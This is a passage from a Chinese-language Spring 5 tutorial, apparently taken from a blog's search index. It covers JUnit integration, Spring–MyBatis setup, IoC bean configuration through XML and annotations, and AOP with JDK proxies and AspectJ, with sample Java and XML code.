@Test\n    public void testAdd(){\n        userService.add();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n 3. 整合Junit5\n\npackage com.pwddd.spring5new.test;\n\nimport com.pwddd.spring5new.config.SpringConfig;\nimport com.pwddd.spring5new.service.UserService;\nimport org.junit.jupiter.api.Test;\nimport org.junit.jupiter.api.extension.ExtendWith;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.test.context.ContextConfiguration;\nimport org.springframework.test.context.junit.jupiter.SpringExtension;\n\n@ExtendWith(SpringExtension.class)\n@ContextConfiguration(classes = SpringConfig.class)\npublic class TestJunit5 {\n    @Autowired\n    private UserService userService;\n    @Test\n    public void test(){\n        userService.add();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n 4. 使用一个注解代替上面的两个注解\n\n//@ExtendWith(SpringExtension.class)\n//@ContextConfiguration(classes = SpringConfig.class)\n@SpringJUnitConfig(classes = SpringConfig.class)\n\n\n1\n2\n3\n\n\n\n# SpringWebflux\n\n前置知识：SpringMVC、Java8新特性、SpringBoot\n\n#TODO\n\n\n# Spring整合MyBatis\n\n目前我们开发功能的流程中，在service层会手动创建SQLSession对象，并使用SQLSession对象获取Mapper接口的实例化对象，但是我们真正使用的是Mapper接口的对象，目前的代码编写方式极大的影响了开发效率，而且mybatis层和service层之间的耦合性非常高。 使用SpringIOC技术实现service层和mybatis层的解耦：让Spring容器帮我们获取Mapper层接口的实例化 对象，我们直接从Spring容器中获取使用即可。 在业务层使用Spring容器对象获取Mapper接口实例化对象后，实现了service层和mybatis层的解耦，但是在controller层我们依然在Servlet中直接创建Service对象，耦合性过高。 将service对象配置为bean对象，Servlet中从Spring容器中，获取Service对象，完成功能开发。同时传统的获取Spring容器的方法写在每个Servlet的service方法中，假设每个请求调用service都要创建一个servlet，那么就会造成容器的资源浪费。\n\n分别配置数据源，sqlSessionFactory，扫描Mapper\n\n<bean class="org.springframework.jdbc.datasource.DriverManagerDataSource" id="dataSource">\n<property name="url" value="jdbc:mysql://localhost:3306/test?characterEncoding=utf8&useSSL=false&serverTimezone=Asia/Shanghai"/>\n<property name="driverClassName" value="com.mysql.jdbc.Driver" />\n<property name="username" value="root" />\n<property name="password" value="123456" />\n</bean>\n\n\x3c!--    配置sqlSessionFactory--\x3e\n<bean class="org.mybatis.spring.SqlSessionFactoryBean" id="factory">\n<property name="dataSource" ref="dataSource" />\n</bean>\n\n\x3c!--    配置扫描mapper--\x3e\n<bean class="org.mybatis.spring.mapper.MapperScannerConfigurer" id="mapperScanner">\n<property name="sqlSessionFactory"  ref="factory"/>\n<property name="basePackage" value="pers.jm.mapper"/>\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n配置service层Bean service层需要调用mapper层的方法，因此在service中需要mapper层的对象。在service层中声明mapper层的引用，并为之创建getset方法。\n\nUserMapper userMapper;\n\n  public UserMapper getUserMapper() {\n      return userMapper;\n  }\n\n  public void setUserMapper(UserMapper userMapper) {\n      this.userMapper = userMapper;\n  }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n之后配置service层的bean,添加自动扫描mapper类的对象引用\n\n<bean class="pers.jm.service.UserServiceImpl" id="userService">\n    <property name="userMapper" ref="userMapper" />\n</bean>\n\n\n1\n2\n3\n\n\n在web.xml加载spring的配置文件并设置监听器\n\n<context-param>\n    <param-name>contextConfigLocation</param-name>\x3c!--键名--\x3e\n    <param-value>classpath:applicationContext.xml</param-value>\x3c!--值--\x3e\n  </context-param>\n  <listener>\n    <listener-class>\n      org.springframework.web.context.ContextLoaderListener\n    </listener-class>\n  </listener>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n在servlet的init方法中，获取对象\n\nUserService userService;\n@Override\npublic void init() throws ServletException {\n    WebApplicationContext webApplicationContext = WebApplicationContextUtils.getWebApplicationContext(this.getServletContext());\n    userService = (UserService) webApplicationContext.getBean("userService");\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n至此，servlet → service → mapper 依赖配置完成\n\n当服务器启动时，通过web.xml中配置的监听器，加载spring的配置文件，spring配置文件加载后，设置mybatis的数据源，sqlsession等并扫描创建对应的mapper对象。mapper对象创建后，根据配置创建service的对象，service对象中注入mapper层的对象引用。因此servlet获取service对象，实际上获取的是 有mapper引用的service层对象。',normalizedContent:'# spring5\n\n\n# spring简介\n\n\n# 概述\n\nspring是一个控制反转(springioc)和面向切面的(springaop)的轻量级框架。spring是一个框架集,内部集成了很多的功能,可以根据需求选择对应的子框架使用。\n\n作用：\n\n * 简化企业项目的开发的流程，提升开发效率\n * 便于代码的后期维护升级\n * 将代码之间的耦合性降低\n\nspring framework 组成部分\n\n\n\n核心概念：\n\n * springioc：控制反转，把创建对象过程交给spring进行管理\n * springaop：面向切面，不修改源代码进行功能增强\n\n\n# springdemo\n\n> spring组件下载地址：jfrog (spring.io)\n\n 1. 创建项目，导入基础jar包\n    \n    \n\n 2. 创建测试类\n\n\tpackage com.pwddd.spring5; \n\tpublic class user { \n\t\tpublic void add(){ \n\t\t\tsystem.out.println("add......."); \n\t\t} \n\t}\n\n\n1\n2\n3\n4\n5\n6\n\n 3. 创建配置文件\n\n<?xml version="1.0" encoding="utf-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n       xmlns:p="http://www.springframework.org/schema/p"\n       xsi:schemalocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">\n\n    <bean id="user" class="com.pwddd.spring5.user" />\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 4. 编写测试代码\n\n@test\npublic void testadd(){\n    applicationcontext applicationcontext = new classpathxmlapplicationcontext("bean1.xml");\n    user user = applicationcontext.getbean("user", user.class);\n    system.out.println(user);\n    user.add();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# springioc\n\n\n# 背景\n\n在使用mvc的结构体系来完成后台功能代码的声明时，在一定程度上降低了代码的冗余，但是层与层之间的耦合性过高，造成代码升级维护特别麻烦。比如，某天业务层某个类文件需要替换为新的类文件，那么，控制层所有调用该业务类的代码需要全部修改为调用新的业务类。 解决办法就是将层与层对象之间的关系解耦，由直接关系变为间接关系。\n\n\n# ioc底层原理\n\n# 什么是ioc\n\n控制反转，把对象创建和对象之间的调用过程，交给spring进行管理 使用ioc目的：为了耦合度降低\n\n# 原理讲解\n\n\n\n# beanfactory接口\n\nioc思想基于ioc容器完成，ioc容器底层就是对象工厂。spring提供ioc容器实现两种方式：（两个接口）\n\n * beanfactory：ioc容器基本实现，是spring内部的使用接口，不提供开发人员进行使用\n   * 加载配置文件时候不会创建对象，在获取对象（使用）才去创建对象\n * applicationcontext：beanfactory接口的子接口，提供更多更强大的功能，一般由开发人员进行使用\n   * 加载配置文件时候就会把在配置文件对象进行创建\n\n\n# bean管理\n\nbean管理包含两个方面：\n\n * spring创建对象\n * spring注入属性\n\nbean管理的两种方式：\n\n * 基于xml进行配置\n * 基于注解的方式实现\n\n# 基于xml进行配置\n\n# 创建对象\n\n在spring配置文件中，使用bean标签，标签里面添加对应属性，就可以实现对象创建。创建对象时，默认执行无参数构造方法完成对象的创建。在bean标签有很多属性，常用的属性有两个：\n\n * id属性：唯一标识\n * class属性：类全路径（包类路径）\n\nuser bean配置：\n\n<bean id="user" class="com.pwddd.spring5.user" />\n\n\n1\n\n\n# 注入属性\n\n注入属性有两种方式：\n\n * 使用set方法进行注入\n * 使用构造器进行注入\n * p名称空间注入（实际上是set方法注入）\n\n# 使用set进行注入\n\n 1. 创建类，编写对应属性的set方法。\n\npackage com.pwddd.spring5;\n\npublic class book {\n    public string name;\n    public string author;\n\n    public void setname(string name) {\n        this.name = name;\n    }\n\n    public void setauthor(string author) {\n        this.author = author;\n    }\n\n    @override\n    public string tostring() {\n        return "book{" +\n                "name=\'" + name + \'\\\'\' +\n                ", author=\'" + author + \'\\\'\' +\n                \'}\';\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n 2. 编写xml配置文件，使用property进行注入\n\n<bean id="book" class="com.pwddd.spring5.book" >\n    <property name="name" value="红楼"></property>\n    <property name="author" value="曹雪芹"></property>\n</bean>\n\n\n1\n2\n3\n4\n\n\n# 使用带参构造进行注入\n\n 1. 创建类，并生成带参构造器。\n\npackage com.pwddd.spring5;\n\npublic class order {\n    public string id;\n    public string phone;\n\n    @override\n    public string tostring() {\n        return "order{" +\n                "id=\'" + id + \'\\\'\' +\n                ", phone=\'" + phone + \'\\\'\' +\n                \'}\';\n    }\n\n    public order(string id, string phone) {\n        this.id = id;\n        this.phone = phone;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n 2. 编写配置xml配置文件，使用constructor-arg进行注入。\n\n<bean id="order" class="com.pwddd.spring5.order" >\n    <constructor-arg index="0" value="00001"></constructor-arg>\n    <constructor-arg index="1" value="上海"></constructor-arg>\n</bean>\n\n\n1\n2\n3\n4\n\n\n# p名称空间注入\n\n 1. 添加p名称空间xmlns\n\nxmlns:p="http://www.springframework.org/schema/p"\n\n\n1\n\n 2. 编写xml配置文件\n\n\x3c!--    p注入需要添加xmlns：p\n        p注入需要set方法\n--\x3e\n<bean id="book" class="com.pwddd.spring5.book" p:name="西游记" p:author="hahah" />\n\n\n1\n2\n3\n4\n\n\n# 不同类型的属性注入方式\n\n# 字面量null\n\n<bean id="order" class="com.pwddd.spring5.order" >\n  <constructor-arg index="0">\n      <null></null>\n  </constructor-arg>\n  <constructor-arg index="1">\n      <null></null>\n  </constructor-arg>\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# 包含特殊字符的属性值\n\n<constructor-arg index="1">\n    <value><![cdata[<>hahah<>]]>&gt; &lt; </value>\n</constructor-arg>\n\n\n1\n2\n3\n\n\n# 外部bean\n\nuserservice中需要依赖userdao，可以使用外部bean的方式将userdao注入到userservice中。\n\n 1. 创建userservice\n\npackage com.pwddd.spring5.service.impl;\n\nimport com.pwddd.spring5.dao.userdao;\nimport com.pwddd.spring5.service.userservice;\n\npublic class userserviceimpl implements userservice {\n    private userdao userdao;\n\n    public void setuserdao(userdao userdao) {\n        this.userdao = userdao;\n    }\n\n    @override\n    public void adduser() {\n        system.out.println("service...adduser");\n        userdao.adduser();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n 2. 创建userdao\n\npackage com.pwddd.spring5.dao.impl;\n\nimport com.pwddd.spring5.dao.userdao;\n\npublic class userdaoimpl implements userdao {\n    @override\n    public void adduser() {\n        system.out.println("dao......adduser");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n 3. 编写配置文件，使用ref注入外部bean\n\n<bean id="userservice" class="com.pwddd.spring5.service.impl.userserviceimpl">\n    <property name="userdao" ref="userdaoimpl"></property>\n</bean>\n\n<bean id="userdaoimpl" class="com.pwddd.spring5.dao.impl.userdaoimpl"></bean>\n\n\n1\n2\n3\n4\n5\n\n 4. 编写测试代码\n\n@test\npublic void testuser(){\n\tuserservice userservice = context.getbean("userservice", userservice.class);\n\tuserservice.adduser();\n}\n\n\n1\n2\n3\n4\n5\n\n\n# 内部bean\n\n如果需要在实体类中表示类和类之间的对应关系，可以使用内部bean方式进行表示。\n\n 1. 编写测试dept类\n\npackage com.pwddd.spring5;\n\npublic class dept {\n    private string dname;\n    public void setdname(string dname) {\n        this.dname = dname;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 2. 编写测试emp类\n\npackage com.pwddd.spring5;\n\npublic class emp {\n    private string ename;\n    private string gender;\n    //员工属于某一个部门，使用对象形式表示\n    private dept dept;\n    public void setdept(dept dept) {\n        this.dept = dept;\n    }\n    public void setename(string ename) {\n        this.ename = ename;\n    }\n    public void setgender(string gender) {\n        this.gender = gender;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n 3. 第一种方式配置文件\n\n<bean id="emp" class="com.pwddd.spring5.emp">\n  <property name="ename"  value="lalal"></property>\n  <property name="gender" value="male"></property>\n  <property name="dept">\n      <bean id="dept" class="com.pwddd.spring5.dept">\n          <property name="dname" value="安保"></property> \n      </bean>\n  </property>\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n 4. 第二种方式需要在emp中生成dept的get方法\n\npublic dept getdept() { return dept; }\n\n\n1\n\n 5. 第二种方式配置文件\n\n<bean id="emp" class="com.pwddd.spring5.emp">\n    <property name="gender" value="male"></property>\n    <property name="ename"  value="lalal"></property>\n    <property name="dept" ref="dept"></property>\n    <property name="dept.dname" value="保安"></property>\n</bean>\n<bean id="dept" class="com.pwddd.spring5.dept">\n    <property name="dname"  value="财务"></property>\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# 集合类型\n\n集合类型支持array、list、map、set等类型。\n\n 1. 编写测试类，类中包含集合类型的依赖关系\n\npackage com.pwddd.spring5;\n\nimport java.util.arrays;\nimport java.util.list;\nimport java.util.map;\nimport java.util.set;\n\npublic class stu {\n    public string[] courses;\n\n    public list<string> lists;\n\n    public map<string, string> maps;\n\n    public set<string> sets;\n\n    public void setcourses(string[] courses) {\n        this.courses = courses;\n    }\n\n    public void setlists(list<string> lists) {\n        this.lists = lists;\n    }\n\n    public void setmaps(map<string, string> maps) {\n        this.maps = maps;\n    }\n\n    public void setsets(set<string> sets) {\n        this.sets = sets;\n    }\n\n    @override\n    public string tostring() {\n        return "stu{" +\n                "courses=" + arrays.tostring(courses) +\n                ", lists=" + lists +\n                ", maps=" + maps +\n                ", sets=" + sets +\n                \'}\';\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n 2. 编写xml配置文件配置注入。\n\n<bean id="stu" class="com.pwddd.spring5.stu">\n    <property name="courses">\n        <array>\n            <value>语文</value>\n            <value>数学</value>\n        </array>\n    </property>\n\n    <property name="lists">\n        <list>\n            <value>张三</value>\n            <value>李四</value>\n        </list>\n    </property>\n\n    <property name="maps">\n        <map>\n            <entry key="java" value="1"></entry>\n            <entry key="c" value="2"></entry>\n        </map>\n    </property>\n\n    <property name="sets">\n        <set>\n            <value>aaa</value>\n            <value>bbb</value>\n        </set>\n    </property>\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n# 集合内容提取\n\n如果多个依赖注入需要引用相同的集合值，那么可以将集合值提取出来，用的时候直接引用即可。提取需要引入util。\n\n实例xml配置：\n\n<?xml version="1.0" encoding="utf-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n       xmlns:util="http://www.springframework.org/schema/util"\n       xsi:schemalocation="\n       http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n       http://www.springframework.org/schema/util http://www.springframework.org/schema/util/spring-util.xsd">\n<util:list id="booklist">\n        <value>haha</value>\n        <value>lala</value>\n    </util:list>\n\n    <bean id="book" class="com.pwddd.spring5.book">\n        <property name="booklist" ref="booklist"></property>\n    </bean>\n\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# 工厂bean\n\nspring有两种类型bean，一种普通bean，另外一种工厂bean（factorybean，不同于beanfactory）\n\n * 普通bean：在配置文件中定义bean类型就是返回类型\n * 工厂bean：在配置文件定义bean类型可以和返回类型不一样\n\n工厂bean的使用方式：\n\n 1. 创建类，使这个类成为工厂，并实现factorybean接口\n\npackage com.pwddd.spring5;\n\nimport com.pwddd.spring5.course;\nimport org.springframework.beans.factory.factorybean;\n\npublic class myfactorybean implements factorybean<course> {\n  @override\n  public course getobject() throws exception {\n\t  course course = new course();\n\t  course.setcname("aaa");\n\t  return course;\n  }\n\n  @override\n  public class<?> getobjecttype() {\n\t  return course.class;\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n 2. 实现接口里面的方法，在实现的方法中定义返回的bean类型\n\n<bean id="factorybean" class="com.pwddd.spring5.myfactorybean"></bean>\n\n\n1\n\n\n# bean的作用域\n\n在spring里面，默认情况下，bean是单实例对象。\n\n\n\n可以通过配置文件设置bean是单例的还是多例的模式： 在spring配置文件bean标签里面有属性（scope）用于设置单实例还是多实例 第一个值 默认值，singleton，表示是单实例对象 第二个值prototype，表示是多实例对象\n\n<bean id="course" class="com.pwddd.spring5.course" scope="prototype"></bean>\n\n\n1\n\n\nsingleton和prototype区别\n\n * singleton单实例，prototype多实例\n * 设置scope值是singleton时候，加载spring配置文件时候就会创建单实例对象\n * 设置scope值是prototype时候，不是在加载spring配置文件时候创建对象，在调用getbean方法时候创建多实例对象\n\n# bean生命周期和后置处理器\n\n# bean生命周期\n\n * 通过构造器创建bean实例（无参数构造）\n * 为bean的属性设置值和对其他bean引用（调用set方法）\n * 把bean实例传递bean后置处理器的方法postprocessbeforeinitialization\n * 调用bean的初始化的方法（需要进行配置初始化的方法）\n * 把bean实例传递bean后置处理器的方法 postprocessafterinitialization\n * bean可以使用了（对象获取到了）\n * 当容器关闭时候，调用bean的销毁的方法（需要进行配置销毁的方法）\n\n# 后置处理器\n\n创建后置处理器需要实现beanpostprocessor接口，并重写%before%和%after%两个方法。\n\n# 属性自动装配\n\n根据指定装配规则（属性名称或者属性类型），spring自动将匹配的属性值进行注入。\n\n根据名称自动装配\n<bean id="emp" class="com.pwddd.spring5.emp" autowire="byname"></bean>\n    <bean id="dept" class="com.pwddd.spring5.dept"></bean>\n    <bean id="dept2" class="com.pwddd.spring5.dept"></bean>\n\n根据类型自动装配  报错 存在两个相同的类型\n<bean id="emp" class="com.pwddd.spring5.emp" autowire="bytype"></bean>\n    <bean id="dept" class="com.pwddd.spring5.dept"></bean>\n    <bean id="dept2" class="com.pwddd.spring5.dept"></bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# 引入外部配置文件\n\n配置数据源的方式1：\n\n<bean id="datasource" class="com.alibaba.druid.pool.druiddatasource">\n    <property name="url" value="jdbc:mysql://localhost:3306/aaaa" />\n    <property name="username" value="root" />\n    <property name="password" value="root" />\n    <property name="driverclassname" value="com.mysql.jdbc.driver" />\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n\n\n配置数据源的方式2：\n\n 1. 创建jdbc.properties外部配置文件\n\njdbc.url=jdbc:mysql://localhost:3306/aaa\njdbc.username=root\njdbc.password=root\njdbc.driver=com.jdbc.mysql.driver\n\n\n1\n2\n3\n4\n\n 2. 引入到xml中，并进行引用。\n\n<context:property-placeholder location="classpath:jdbc.properties"></context:property-placeholder>\n<bean id="datasource" class="com.alibaba.druid.pool.druiddatasource">\n    <property name="driverclassname" value="${jdbc.driver}"/>\n    <property name="username" value="${jdbc.username}" />\n    <property name="url" value="${jdbc.url}" />\n    <property name="password" value="${jdbc.password}" />\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 基于注解进行配置\n\n注解是代码特殊标记，格式：@注解名称(属性名称=属性值, 属性名称=属性值..)。注解可以放在类上面、方法上面、属性上面。使用注解进行配置可以简化xml文件。\n\n# 创建对象\n\nspring针对bean管理中创建对象提供注解\n\n * @component -- 普通bean\n * @service -- service层\n * @controller -- controller层\n * @repository --dao层\n\n使用方式：\n\n 1. 开启组件扫描\n\n<?xml version="1.0" encoding="utf-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n     xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n     xmlns:context="http://www.springframework.org/schema/context"\n     xsi:schemalocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\nhttp://www.springframework.org/schema/context  http://www.springframework.org/schema/context/spring-context.xsd">\n  <context:component-scan base-package="com.pwddd.spring5.anno"></context:component-scan>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 2. 将注解加到类上\n\npackage com.pwddd.spring5.anno;\n\nimport org.springframework.stereotype.service;\n\n@service(value = "userservice")\npublic class userservice {\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 3. 配置组件扫描过滤 组件扫描可以配置扫描某些组件、不扫描某些组件。\n\n<context:component-scan base-package="com.pwddd.spring5.anno" use-default-filters="false">\n    <context:include-filter type="annotation" expression="org.springframework.stereotype.service"/>\n    <context:exclude-filter type="annotation" expression="org.springframework.stereotype.controller"/>\n</context:component-scan>\n\n\n1\n2\n3\n4\n\n\n# 注入属性\n\n注入属性有下面几种注解的方式：\n\n * @autowired：根据属性类型进行自动装配\n * @qualifier：根据名称进行注入 这个@qualifier注解的使用，和上面@autowired一起使用\n * @resource：可以根据类型注入，可以根据名称注入\n * @value：注入普通类型属性\n\n测试类：\n\npackage com.pwddd.spring5.anno;\n\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.beans.factory.annotation.qualifier;\nimport org.springframework.beans.factory.annotation.value;\nimport org.springframework.stereotype.service;\n\nimport javax.annotation.resource;\n\n@service(value = "userservice")\npublic class userservice {\n//    @autowired\n//    @qualifier(value = "dao")\n  @resource\n  public userdao userdao;\n\n  @value("halo")\n  public string name;\n\n  public void test(){\n      system.out.println(name);\n      userdao.add();\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n# 完全注解开发\n\n使用一个类来替换xml文件，进行配置。\n\n@configuration  // 声明这是一个配置类\n@componentscan(basepackages = {"com.pwddd.spring5.anno"})  //配置包扫描\npublic class springconfig {\n}\n\n\n1\n2\n3\n4\n\n\n测试代码annotationconfigapplicationcontext使用类生成context对象\n\n@test\npublic void test(){\n    applicationcontext context = new annotationconfigapplicationcontext(springconfig.class);\n    userservice userservice = context.getbean("userservice", userservice.class);\n    userservice.test();\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n# 注解方式的配置文件注入\n\npackage com.pwddd.spring5.dao.impl;  \n  \nimport com.pwddd.spring5.dao.userdao;  \nimport com.pwddd.spring5.entity.user;  \nimport org.springframework.beans.factory.annotation.autowired;  \nimport org.springframework.beans.factory.annotation.value;  \nimport org.springframework.context.annotation.propertysource;  \nimport org.springframework.stereotype.repository;  \n  \n@repository  \n@propertysource("classpath:test.properties")  \npublic class userdaoimpl implements userdao {  \n  \n @value("${properties.result}")  \n private string result;  \n  \n @override  \n public user getuserbyusername(string username) {  \n system.out.println(result);  \n return new user("zhangsan","male",12);  \n }  \n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# springaop\n\n\n# aop概念\n\n面向切面编程（方面），利用 aop 可以对业务逻辑的各个部分进行隔离，从而使得 业务逻辑各部分之间的耦合度降低，提高程序的可重用性，同时提高了开发的效率。 通俗描述：不通过修改源代码方式，在主干功能里面添加新功能。\n\n\n\n\n# aop底层原理\n\naop底层使用动态代理实现，动态代理有两种，一种是有接口的情况，使用jdk的动态代理。\n\n\n\n第二种是没有接口的情况，使用cglib动态代理\n\n\n\njdk动态代理实现的方式\n\n\n\n 1. 创建接口，定义相关的方法\n\npackage com.pwddd.spring5aop.test;\n\npublic interface userdao {\n    int add(int a, int b);\n    string update(string id);\n}\n\npackage com.pwddd.spring5aop.test;\n\npublic class userdaoimpl implements userdao{\n    @override\n    public int add(int a, int b) {\n        system.out.println("add... 方法执行了！");\n        return a+b;\n    }\n\n    @override\n    public string update(string id) {\n        return id;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n 2. 创建代理类\n\npackage com.pwddd.spring5aop.test;\n\nimport java.lang.reflect.invocationhandler;\nimport java.lang.reflect.method;\nimport java.lang.reflect.proxy;\nimport java.util.arrays;\n\npublic class jdkproxy {\n    public static void main(string[] args) {\n        class[] interfaces = {userdao.class};\n        userdaoimpl userdao = new userdaoimpl();\n        userdao dao = (userdao) proxy.newproxyinstance(jdkproxy.class.getclassloader(), interfaces, new userdaoproxy(userdao));\n        system.out.println("result:"+dao.add(1, 2));\n    }\n}\n\nclass userdaoproxy implements invocationhandler{\n    private object obj;\n\n    public userdaoproxy(object obj) {\n        this.obj = obj;\n    }\n\n    @override\n    public object invoke(object proxy, method method, object[] args) throws throwable {\n\n        // 方法执行之前\n        system.out.println("方法执行之前:"+method.getname()+ arrays.tostring(args));\n        object result = method.invoke(obj, args);\n        system.out.println("方法执行之后:"+obj);\n        return result;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n\n# aop相关概念\n\n连接点 - 类里的那些方法可以被增强，这些可以被增强的方法称为连接点 切入点 - 实际被真正增强的方法称为切入点 通知（增强） - 用于增强的逻辑部分 - 分为：前置、后置、环绕、异常、返回（最终）通知类型 切面 - 实际上把增强应用到切入点的过程，这个动作。\n\n\n# aop环境准备\n\nspring 框架一般都是基于 aspectj 实现 aop 操作。aspectj 不是 spring 组成部分，是一个独立 的aop 框架，一般把 aspectj 和 spirng 框架一起使用，进行 aop 操作。 基于aspectj有两种实现aop的操作方式：\n\n * 基于xml文件的方式\n * 基于注解的方式\n\n依赖的jar包：\n\n\n\n切入点表达式\n切入点表达式作用：知道对哪个类里面的哪个方法进行增强\n语法结构： execution([权限修饰符] [返回值类型] [类全路径\\].方法名(\\[形参列表\\])\n举例 1：对 com.atguigu.dao.bookdao 类里面的 add 进行增强 \n\texecution(* com.atguigu.dao.bookdao.add(..)) \n举例 2：对 com.atguigu.dao.bookdao 类里面的所有的方法进行增强 \n\texecution(* com.atguigu.dao.bookdao.* (..)\n举例 3：对 com.atguigu.dao 包里面所有类，类里面所有方法进行增强 \n\texecution(* com.atguigu.dao.*.** (..))\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 基于注解方式的配置\n\n 1. 创建增强类和被增强的方法\n\npublic class user {\n    public void add(){\n        /**\n         * 被增强方法\n         */\n        system.out.println("add........");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 2. 创建增强类和相关增强方法\n\npublic class userproxy {\n    /**\n     * 增强方法\n     */\n    public void before(){\n        system.out.println("before ..... userproxy");\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n\n 3. 进行配置，开启注解扫描，生成代理对象\n\n\x3c!--    开启注解扫描--\x3e\n <context:component-scan base-package="com.pwddd.spring5aop.aopanno" />\n\x3c!--    开启生成代理对象--\x3e\n <aop:aspectj-autoproxy />\n\n\n1\n2\n3\n4\n\n 4. 配置通知类型\n\n@before(value = "execution(* com.pwddd.spring5aop.aopanno.user.add(..))")\npublic void before(){\n    system.out.println("before ..... userproxy");\n}\n\n@after(value = "execution(* com.pwddd.spring5aop.aopanno.user.add(..))")\npublic void after(){\n    system.out.println("after ..... userproxy");\n}\n@afterthrowing(value = "execution(* com.pwddd.spring5aop.aopanno.user.add(..))")\npublic void afterthrowing(){\n    system.out.println("afterthrowing ..... userproxy");\n}\n\n@afterreturning(value = "execution(* com.pwddd.spring5aop.aopanno.user.add(..))")\npublic void afterreturning(){\n    system.out.println("afterreturning ..... userproxy");\n}\n\n@around(value = "execution(* com.pwddd.spring5aop.aopanno.user.add(..))")\npublic void around(proceedingjoinpoint proceedingjoinpoint) throws throwable {\n\n    system.out.println("around ..... qian");\n    proceedingjoinpoint.proceed();\n    system.out.println("around ------ hou");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n 5. 相同切入点表达式可抽取出来\n\n/**\n * 抽取相同的切入点表达式\n */\n@pointcut(value = "execution(* com.pwddd.spring5aop.aopanno.user.add(..))")\npublic void mypoint(){\n\n}\n\n/**\n * 增强方法\n */\n@before(value = "mypoint()")\npublic void before(){\n    system.out.println("before ..... userproxy");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n 6. 多个增强的方法作用于同一个方法，可以设置优先级\n\n@component\n@aspect\n@order(1)\npublic class personproxy {\n    @before(value = "execution(* com.pwddd.spring5aop.aopanno.user.add(..))")\n    public void before(){\n        system.out.println("person ......");\n    }\n}\n\n从小到大优先级降低\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n 7. 配置完全注解开发\n\npackage com.pwddd.spring5aop.aopanno;\n\nimport org.springframework.context.annotation.componentscan;\nimport org.springframework.context.annotation.configuration;\nimport org.springframework.context.annotation.enableaspectjautoproxy;\n\n@configuration\n@componentscan(basepackages = {"com.pwddd.spring5aop.aopanno"})  // 